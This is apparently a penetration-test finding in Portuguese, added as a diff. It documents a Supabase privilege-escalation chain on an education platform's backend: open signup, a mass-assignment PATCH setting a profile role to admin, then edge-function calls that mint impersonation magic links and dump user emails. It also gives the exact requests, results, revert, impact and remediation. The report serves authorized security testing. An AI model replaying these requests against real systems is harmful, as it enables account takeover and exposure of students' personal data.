@@ -1,0 +1,80 @@
+# F-021 — Supabase: auto-elevação student→admin (mass assignment) + impersonação de qualquer usuário (cadeia de account takeover)
+
+Alvo: nnvdfnuopgtrjzfburub.supabase.co (backend de simuladosoba.pmminas.com / "Forja OBA")
+Severidade: **Crítica** (escalada do F-014 — de vazamento PII para takeover total de contas)
+Timestamp: 2026-08-20T16:26Z
+
+## Reprodução
+
+```bash
+# 1. Conta anon (signup aberto + autoconfirm — F-006):
+POST /auth/v1/signup {"email":"<teste>@...","password":"..."}   # apikey anon
+→ JWT authenticated (role claim "authenticated"), user_id criado
+
+# 2. Mass assignment na PRÓPRIA profile (RLS UPDATE self, sem whitelist de colunas):
+PATCH /rest/v1/profiles?id=eq.<minha-profile>
+Authorization: Bearer <JWT>
+{"role":"admin"}
+→ 200, row atualizada p/ role=admin
+
+# 3. Edge functions passam a tratar como admin (checagem lê profiles.role):
+POST /functions/v1/impersonate-user  {"userId":"<QUALQUER user id>"}
+Authorization: Bearer <MESMO JWT>
+→ 200 {"success":true,"magicLink":"https://.../auth/v1/verify?token=<TOKEN>&type=magiclink..."}
+
+POST /functions/v1/admin-get-users  {}
+→ 200: lista de 3119 usuários (id → email)
+```
+
+## Output
+
+- `{"role":"admin"}` na própria row: **aceito** (200, row retornada com role=admin).
+- `impersonate-user` (testado APENAS com o próprio user id, por restrição de escopo):
+  **`success:true` + magic link válido gerado** — o token de verify dá login completo
+  no usuário escolhido.
+- `admin-get-users`: **3.119 emails** devolvidos (id→email), ~3.096 contas reais de
+  alunos (gmail etc.) + ~23 resíduos de pentests.
+- `bulk-create-students`: 403 (checagem alternativa via JWT/service role — única fn
+  que não usa profiles.role).
+- REVERT imediato: `{"role":"student","nickname":null}` → 200; `admin-get-users`
+  pós-revert → 403 "Sem permissão de administrador" ✓.
+- Detalhe técnico: o JWT mantém role claim "authenticated" — a permissão admin vem
+  SOMENTE da coluna profiles.role lida pela edge function (source of trust = banco).
+
+## Interpretação
+
+A política RLS de UPDATE permite alterar qualquer coluna da própria row, incluindo
+`role`. As edge functions admin confiam em `profiles.role` (não em claim do JWT nem
+em auth.users). Com signup aberto (F-006) e RLS de SELECT aberto (F-014), a cadeia
+anon→admin→takeover de qualquer conta é executável em ~3 requests, sem credencial
+alguma. `reset-password-to-cpf` (admin) + CPFs vazados no F-014 formam segunda rota
+de takeover independente de magic link.
+
+## Impacto
+
+- **Account takeover de TODOS os 3.118 alunos + admins** (Otávio/Natana): impersonate
+  via magic link ou reset de senha via CPF.
+- Leitura em massa de emails (3.119) via admin-get-users (PII adicional além do F-014).
+- Destruição/manipulação: delete-user, update-user-email, bulk-create-students
+  (admin via profiles.role em 5 das 7 funções).
+- LGPD em agravamento: PII (CPF+email+nome) + credenciais de acesso (takeover).
+- Reputação: ataque pode se passar pelos admins (Natana/Otávio) e comprometer
+  clientes/parceiros.
+
+## Recomendação
+
+1. **Imediato**: remover `role` do UPDATE RLS (política com colunas permitidas ou
+   trigger que ignore role); tratar como INCIDENTE (logs: quem já elevou role / quem
+   usou impersonate — auditar admin_notifications/profile_audit_log).
+2. Edge functions: nunca confiar em profiles.role — usar claim do JWT (auth.jwt) com
+   role gerenciada no Supabase Auth (admin claims) ou service_role.
+3. Desabilitar signup aberto (F-006) — elimina a porta de entrada.
+4. Rotacionar: assumir que todas as contas de aluno foram potencialmente
+   comprometíveis (aviso + forçar reset de senha).
+5. Auditar edge functions: adicionar rate limit + logging de quem gerou magic links.
+
+## Próximo passo
+
+- Report (coordenador): comunicar cliente como incidente crítico.
+- Pós-remediação: retestar cadeia (deve retornar 42501 no PATCH role + 403 nas fns).
+- Verificar se provaoral (outro backend) tem o mesmo padrão de checagem de admin.
